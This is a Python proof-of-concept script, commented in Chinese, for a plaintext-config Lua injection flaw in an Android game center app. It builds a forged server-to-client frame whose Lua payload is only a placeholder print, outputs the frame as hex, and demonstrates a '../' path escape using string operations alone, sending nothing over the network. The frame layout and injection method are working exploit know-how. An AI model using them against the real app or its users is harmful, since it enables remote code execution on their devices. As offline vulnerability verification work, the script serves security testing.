#!/usr/bin/env python3
# 授权环境专用最小验证模板（Phase 5）。默认不发送任何网络请求；涉及设备的操作仅限授权的本地测试设备。
"""VULN-010 任务配置明文 SRS 帧 dofile —— 本地构造伪造帧演示（partial PoC，纯离线）。

证据背景：
  - 服务端任务配置以明文 SRS 帧（proc!=0 的 s2c 帧体为明文）下发并 dofile：
    lua-src-apk/app/Req/Task/ReqTaskConfig.lua:44-58
    （os.execute mkdir + saveTaskConfigFile + dofile(writablePath..appID.."/"..key)）。
  - dofile 执行的是帧体内容 => 明文通道可注入任意 Lua。

边界（重要）：
  - 注入该帧需 TCP 中间人位置，blocked_on=no_authorization_online，本脚本不做任何发送。
  - 本脚本仅按帧格式在本地构造伪造帧并输出 hex；`../` 演示仅做字符串拼接，不落盘到 writablePath 之外。
"""
import argparse
import posixpath
import sys

HEADER_LEN = 12

# 伪造任务配置 Lua 模板（占位内容，仅用于演示帧结构；{key} 会被 --key-name 替换）
FAKE_TASK_LUA_TEMPLATE = """-- Phase5 授权验证样本（伪造任务配置，仅本地演示）
local M = {{}}
M["{key}"] = {{
    id = "poc-task",
    title = "POC-TASK-CONFIG",
    reward = 0,
}}
print("PWNED-POC task config loaded: {key}")
return M
"""


def build_frame(body: bytes, xy: int, proc: int, appid: int, flag: int) -> bytes:
    if proc == 0:
        raise ValueError("proc 必须 != 0（proc==0 为加密链路帧，本演示针对明文配置帧）")
    if not (0 <= xy <= 0xFFFF and 0 <= proc <= 0xFFFF and 0 <= appid <= 0xFFFFFFFF):
        raise ValueError("xy/proc/appid 超出字段位宽")
    header = bytes([0x00, flag])  # dir=0 => s2c
    header += len(body).to_bytes(2, "little")
    header += xy.to_bytes(2, "little")
    header += proc.to_bytes(2, "little")
    header += appid.to_bytes(4, "little")
    return header + body


def demo_path_join(writable_path: str, appid: int, key: str) -> None:
    """演示 ReqTaskConfig.lua:44-58 的 dofile 路径拼接（仅字符串运算，不写盘）。"""
    raw = f"{writable_path}{appid}/{key}"
    normalized = posixpath.normpath(raw)
    escaped = not normalized.startswith(posixpath.normpath(f"{writable_path}{appid}/") )
    print(f"[=] dofile 路径拼接演示: writablePath..appID..\"/\"..key")
    print(f"    原始拼接   : {raw}")
    print(f"    normpath   : {normalized}")
    print(f"    是否逃逸 appID 目录: {'是（若客户端不过滤 ../ 则 dofile 任意可读路径）' if escaped else '否'}")
    print("    （仅字符串演示，未在任何设备落盘）")


def main() -> int:
    ap = argparse.ArgumentParser(
        description="VULN-010 本地构造伪造任务配置明文 s2c 帧并输出 hex（纯离线，不发送）"
    )
    ap.add_argument("--proc", type=lambda s: int(s, 0), required=True,
                    help="任务配置下发的 proc 号（!=0；真实取值需从 step2 抓包人工确认，见 README TODO）")
    ap.add_argument("--xy", type=lambda s: int(s, 0), default=0, help="xy 字段，默认 0")
    ap.add_argument("--appid", type=lambda s: int(s, 0), default=0, help="appid 字段，默认 0")
    ap.add_argument("--flag", type=lambda s: int(s, 0), default=0x40,
                    help="flag 字节（0x40|0x80），默认 0x40")
    ap.add_argument("--key-name", default="poc_task",
                    help="任务配置 key（参与 dofile 路径拼接；可试 '../poc' 演示路径逃逸拼接）")
    ap.add_argument("--writable-path", default="/data/data/com.xm.zjgamecenter/files/",
                    help="仅用于路径拼接演示的 writablePath 占位值")
    ap.add_argument("--out", help="可选：把帧 hex 写入该文件（默认只打印到 stdout）")
    args = ap.parse_args()

    lua_text = FAKE_TASK_LUA_TEMPLATE.format(key=args.key_name)
    body = lua_text.encode("utf-8")

    try:
        frame = build_frame(body, args.xy, args.proc, args.appid, args.flag)
    except ValueError as e:
        print(f"[-] 参数错误: {e}", file=sys.stderr)
        return 2

    hex_str = frame.hex()
    print("[+] 伪造 s2c 明文任务配置帧（hex）：")
    print(hex_str)
    if args.out:
        with open(args.out, "w", encoding="utf-8") as f:
            f.write(hex_str + "\n")
        print(f"[+] 已写入: {args.out}")

    print()
    demo_path_join(args.writable_path, args.appid, args.key_name)

    print()
    print("[!] 注入该帧需 TCP 中间人位置，blocked_on=no_authorization_online；本脚本未发送任何数据。")
    return 0


if __name__ == "__main__":
    sys.exit(main())
